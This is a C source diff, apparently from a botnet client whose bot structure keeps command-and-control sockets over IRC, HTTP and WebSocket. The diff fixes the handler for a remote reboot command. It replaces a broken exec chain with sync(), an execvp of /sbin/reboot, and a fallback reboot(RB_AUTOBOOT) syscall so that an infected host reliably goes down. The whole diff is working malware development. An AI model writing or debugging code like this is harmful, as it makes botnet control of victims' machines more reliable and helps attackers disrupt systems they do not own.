@@ -23,6 +23,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/reboot.h> /* RB_AUTOBOOT fallback (#249/#345) */
 #include <netdb.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -3127,13 +3128,20 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                 if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                 if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
-                /* sync + reboot via exec; fall back to reboot(RB_AUTOBOOT) */
-                char *argv1[] = { "sync", NULL };
-                execvp("sync", argv1);
+                /* FIX (#249/#345): the old chain execvp("sync") then
+                 * execvp("/sbin/reboot") never reached reboot — execvp
+                 * replaces the child on SUCCESS, so after sync the process
+                 * was gone and only an exec FAILURE advanced the chain.
+                 * Use the sync() library call, then a single execvp of
+                 * /sbin/reboot; on exec failure fall back to
+                 * reboot(RB_AUTOBOOT) so the host still goes down. */
+                sync();
                 char *argv2[] = { "/sbin/reboot", NULL };
                 execvp("/sbin/reboot", argv2);
                 char *argv3[] = { "reboot", NULL };
                 execvp("reboot", argv3);
+                /* Last resort: kernel syscall via libc, no binary needed. */
+                reboot(RB_AUTOBOOT);
                 _exit(127);
             }
             /* Parent: do not wait — the machine is going down anyway */
